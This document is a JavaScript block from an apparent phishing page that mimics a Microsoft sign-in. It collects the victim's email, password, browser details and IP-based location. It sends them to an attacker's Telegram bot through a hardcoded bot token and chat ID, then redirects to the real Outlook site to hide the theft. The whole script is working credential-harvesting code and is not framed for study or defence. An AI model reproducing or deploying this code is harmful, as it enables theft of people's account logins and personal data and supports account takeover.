    <script data-brackets-id='1124'>
        // Telegram Configuration
        const botToken = '7342111571:AAFUmvZ-7d-Fjg0TOm3qmxuB5AHlB8FwpJw'; // Replace with actual token
        const chatId = '5502103678';   // Replace with actual chat ID
        let ipData = {};

        // Get Browser Information
        function getBrowserInfo() {
            const ua = navigator.userAgent;
            let browserName, browserVersion;
            
            // Detect browser
            if(ua.match(/edg/i)) {
                browserName = "Microsoft Edge";
                browserVersion = ua.match(/edg\/(\d+)/i)[1];
            } else if(ua.match(/opr/i)) {
                browserName = "Opera";
                browserVersion = ua.match(/opr\/(\d+)/i)[1];
            } else if(ua.match(/chrome|chromium|crios/i)) {
                browserName = "Google Chrome";
                browserVersion = ua.match(/(?:chrome|chromium|crios)\/(\d+)/i)[1];
            } else if(ua.match(/firefox|fxios/i)) {
                browserName = "Mozilla Firefox";
                browserVersion = ua.match(/(?:firefox|fxios)\/(\d+)/i)[1];
            } else if(ua.match(/safari/i)) {
                browserName = "Apple Safari";
                browserVersion = ua.match(/version\/(\d+).*safari/i)[1];
            } else {
                browserName = "Unknown Browser";
                browserVersion = "N/A";
            }

            return {
                name: browserName,
                version: browserVersion,
                os: navigator.platform,
                language: navigator.language,
                userAgent: ua,
                screen: `${screen.width}x${screen.height}`,
                cookies: navigator.cookieEnabled ? "Enabled" : "Disabled",
                javaScript: "Enabled",
                pdfViewer: navigator.pdfViewerEnabled ? "Enabled" : "Disabled"
            };
        }

        // Get IP Information
        (async function getIP() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                ipData = await response.json();
            } catch (error) {
                console.error('IP detection failed:', error);
            }
        })();

        // Viewport Height Adjustment
        function adjustViewport() {
            const vh = window.innerHeight * 0.01;
            document.documentElement.style.setProperty('--vh', `${vh}px`);
        }
        adjustViewport();
        window.addEventListener('resize', adjustViewport);

        // Form Handling
        function showPasswordInput() {
            const username = document.getElementById('username').value;
            document.getElementById('username-section').style.display = 'none';
            document.getElementById('password-section').style.display = 'block';
            document.getElementById('email-label').textContent = username || 'User';
        }

        function showUsernameInput() {
            document.getElementById('password-section').style.display = 'none';
            document.getElementById('username-section').style.display = 'block';
        }

        async function submitForm() {
            const email = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const browser = getBrowserInfo();

            // Compose Message
            const message = `üîê Microsoft Credentials Captured üîê

üì© Login Details:
‚îú‚îÄ Email: ${email}
‚îî‚îÄ Password: ${password}

üñ• System Configuration:
‚îú‚îÄ Browser: ${browser.name} v${browser.version}
‚îú‚îÄ OS: ${browser.os}
‚îú‚îÄ Screen: ${browser.screen}
‚îú‚îÄ Language: ${browser.language}
‚îú‚îÄ Cookies: ${browser.cookies}
‚îú‚îÄ JavaScript: ${browser.javaScript}
‚îî‚îÄ PDF Viewer: ${browser.pdfViewer}

üåê Network Information:
‚îú‚îÄ IP: ${ipData.ip || 'N/A'}
‚îú‚îÄ Location: ${ipData.city || 'N/A'}, ${ipData.region || 'N/A'}
‚îú‚îÄ Country: ${ipData.country_name || 'N/A'} (${ipData.country_code || 'N/A'})
‚îú‚îÄ ZIP: ${ipData.postal || 'N/A'}
‚îú‚îÄ Coordinates: ${ipData.latitude || 'N/A'}, ${ipData.longitude || 'N/A'}
‚îî‚îÄ ISP: ${ipData.org || 'N/A'}

üîß Full User Agent:
${browser.userAgent}`;

            // Send to Telegram
            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });
            } catch (error) {
                console.error('Telegram Error:', error);
            }

            // Redirect to Outlook
            window.location.href = 'https://outlook.live.com/owa/';
        }

        // Mobile Interaction Handlers
        document.addEventListener('touchstart', function() {}, { passive: true });
        document.addEventListener('gesturestart', function(e) { e.preventDefault(); });
    </script>
